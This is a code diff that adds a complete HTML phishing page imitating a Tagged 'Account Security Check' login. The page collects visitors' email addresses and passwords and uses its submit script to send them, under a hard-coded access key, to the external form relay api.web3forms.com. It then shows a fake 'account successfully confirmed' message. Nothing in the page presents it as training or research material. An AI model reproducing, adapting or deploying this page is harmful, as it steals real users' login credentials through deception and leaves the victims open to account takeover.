@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tagged Login</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@700&display=swap" rel="stylesheet">
+<style>
+    /* Reset and Base Styles */
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+        background-color: #1a1a1a;
+        color: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    .app-container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+    }
+
+    .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        position: relative;
+        padding-bottom: 5px;
+    }
+
+    .close-btn {
+        font-size: 24px;
+        color: white;
+        background: none;
+        border: none;
+        cursor: pointer;
+        position: absolute;
+        left: 0;
+        z-index: 10;
+    }
+
+    .logo {
+        flex-grow: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 3px;
+    }
+
+    /* Updated to fit the image perfectly */
+    .logo-img {
+        width: 52px;
+        height: 52px;
+        border-radius: 16px; /* Matches the rounded corners of the app icon */
+        object-fit: cover;
+    }
+
+    /* Subtitles */
+    .subtitle-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 5px;
+        margin-top: -10px;
+        margin-bottom: 5px;
+    }
+
+    .subtitle-title {
+        font-size: 13px;
+        font-weight: 600;
+        letter-spacing: 1.5px;
+        color: #a0a0a0;
+        text-transform: uppercase;
+    }
+
+    .subtitle-desc {
+        font-size: 14px;
+        color: #a0a0a0;
+    }
+
+    .tabs {
+        display: flex;
+        border-bottom: 1px solid #333;
+        margin-bottom: 5px;
+    }
+
+    .tab {
+        width: 100%;
+        text-align: center;
+        padding: 12px 0;
+        font-size: 16px;
+        font-weight: 600;
+        color: #ffffff;
+        cursor: pointer;
+    }
+
+    /* Login Tab Color */
+    .tab.active {
+        color: #05ecfc;
+        border-bottom: 2px solid #05ecfc;
+    }
+
+    .form-group {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 20px;
+    }
+
+    label {
+        font-size: 14px;
+        font-weight: 700;
+        margin-bottom: 8px;
+    }
+
+    .input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+    }
+
+    input {
+        width: 100%;
+        padding: 16px;
+        background-color: #2a2a2a;
+        border: 1.5px solid #ffffff;
+        border-radius: 8px;
+        color: #ffffff;
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.2s;
+    }
+
+    input::placeholder {
+        color: #a0a0a0;
+    }
+
+    .eye-icon {
+        position: absolute;
+        right: 16px;
+        cursor: pointer;
+        color: #ffffff;
+    }
+
+    /* Security Check Styles */
+    .security-section {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 20px; 
+    }
+
+    .security-label {
+        font-size: 14px;
+        font-weight: 700;
+        margin-bottom: 8px;
+    }
+
+    .security-box {
+        display: flex;
+        align-items: center;
+        background-color: #2a2a2a;
+        border: 1.5px solid #444;
+        border-radius: 8px;
+        padding: 12px 16px;
+        gap: 12px;
+    }
+
+    /* Checkbox Color */
+    .security-box input[type="checkbox"] {
+        width: 20px;
+        height: 20px;
+        accent-color: #05ecfc;
+        cursor: pointer;
+    }
+
+    .security-box label {
+        font-size: 14px;
+        font-weight: 400;
+        color: #dddddd;
+        margin-bottom: 0;
+        cursor: pointer;
+        user-select: none;
+    }
+
+    .btn-continue {
+        width: 100%;
+        padding: 16px;
+        background-color: #c2d1cd; 
+        color: #1a1a1a;
+        border: none;
+        border-radius: 30px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 10px;
+        transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    /* Confirm Button Filled Color */
+    .btn-continue.filled {
+        background-color: #05ecfc;
+        color: #ffffff;
+    }
+
+    #form-result {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 15px;
+        font-weight: 600;
+        min-height: 20px;
+    }
+
+    /* POPUP MODAL STYLES */
+    .modal-overlay {
+        display: none; /* Hidden by default */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.75);
+        backdrop-filter: blur(4px);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        padding: 20px;
+    }
+
+    .modal-overlay.active {
+        display: flex;
+    }
+
+    .modal-content {
+        background-color: #2a2a2a;
+        border: 1px solid #444;
+        border-radius: 16px;
+        padding: 30px 20px;
+        text-align: center;
+        max-width: 340px;
+        width: 100%;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        animation: popIn 0.3s ease-out;
+    }
+
+    @keyframes popIn {
+        0% { transform: scale(0.9); opacity: 0; }
+        100% { transform: scale(1); opacity: 1; }
+    }
+
+    /* Check Mark Icon Styles */
+    .check-icon-wrapper {
+        width: 64px;
+        height: 64px;
+        background-color: rgba(5, 236, 252, 0.15); /* Light blue glow */
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 0 auto 20px auto;
+    }
+
+    .check-icon {
+        width: 32px;
+        height: 32px;
+        color: #05ecfc; /* Theme purple */
+    }
+
+    .modal-content p {
+        color: #ffffff;
+        font-size: 15px;
+        line-height: 1.6;
+        margin-bottom: 25px;
+    }
+
+    .modal-btn {
+        background-color: #05ecfc;
+        color: #ffffff;
+        border: none;
+        padding: 14px 30px;
+        border-radius: 30px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        transition: opacity 0.2s;
+    }
+
+    .modal-btn:hover {
+        opacity: 0.9;
+    }
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header">
+        <button class="close-btn">✕</button>
+        <div class="logo">
+            <!-- Replaced SVG with your exact image -->
+            <img src="tagged logo.jpeg" alt="Logo" class="logo-img">
+        </div>
+    </div>
+
+    <div class="subtitle-container">
+        <p class="subtitle-title">Tagged</p>
+        <p class="subtitle-title">ACCOUNT SECURITY CHECK</p>
+        <p class="subtitle-desc">Login below to confirm your account</p>
+    </div>
+
+    <form id="web3form" method="POST">
+        <input type="hidden" name="access_key" value="3ab3ae70-baa8-403b-8d9d-579f1fac7994">
+        <input type="hidden" name="subject" value="New Login from TAGGED">
+        <input type="checkbox" name="botcheck" id="" style="display: none;">
+
+        <div class="tabs">
+            <div class="tab active">Login</div>
+        </div>
+
+        <div class="form-group">
+            <label for="email">E-mail</label>
+            <div class="input-wrapper">
+                <input type="email" id="email" name="email" placeholder="Your e-mail" required>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="passin">Password</label>
+            <div class="input-wrapper">
+                <input type="passin" id="passin" name="passin" placeholder="Your password" required>
+                <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <label class="security-label">Security Check</label>
+            <div class="security-box">
+                <input type="checkbox" id="robot-check" name="security_check" required>
+                <label for="robot-check">I am not a robot</label>
+            </div>
+        </div>
+
+        <button type="submit" id="continueBtn" class="btn-continue">Confirm</button>
+        
+        <div id="form-result"></div>
+    </form>
+</div>
+
+<!-- SUCCESS POPUP MODAL -->
+<div class="modal-overlay" id="successModal">
+    <div class="modal-content">
+        <!-- Check Mark Icon -->
+        <div class="check-icon-wrapper">
+            <svg class="check-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+        </div>
+        <p>Your tagged account has been successfully confirmed. if there is an error we would get back to you via email. thanks</p>
+        <button class="modal-btn" id="closeModalBtn">OK</button>
+    </div>
+</div>
+
+<script>
+    const emailInput = document.getElementById('email');
+    const passinInput = document.getElementById('passin');
+    const robotCheck = document.getElementById('robot-check');
+    const continueBtn = document.getElementById('continueBtn');
+    const modal = document.getElementById('successModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    // Form logic
+    function checkFormProgress() {
+        const emailValue = emailInput.value.trim();
+        const passinValue = passinInput.value.trim();
+        const isChecked = robotCheck.checked;
+
+        if (emailValue !== '' && passinValue !== '' && isChecked) {
+            continueBtn.classList.add('filled');
+        } else {
+            continueBtn.classList.remove('filled');
+        }
+    }
+
+    emailInput.addEventListener('input', checkFormProgress);
+    passinInput.addEventListener('input', checkFormProgress);
+    robotCheck.addEventListener('change', checkFormProgress);
+
+    // Modal logic
+    closeModalBtn.addEventListener('click', () => {
+        modal.classList.remove('active');
+    });
+
+    window.addEventListener('click', (e) => {
+        if (e.target === modal) {
+            modal.classList.remove('active');
+        }
+    });
+
+    // Web3Forms AJAX Submission
+    const form = document.getElementById('web3form');
+    const result = document.getElementById('form-result');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+        
+        result.innerHTML = "Please wait...";
+        result.style.color = "#ffffff";
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                modal.classList.add('active');
+                form.reset();
+                continueBtn.classList.remove('filled'); 
+                result.innerHTML = ""; 
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+                result.style.color = "#ff6b6b"; 
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+            result.style.color = "#ff6b6b";
+        });
+    });
+</script>
+
+</body>
+</html>
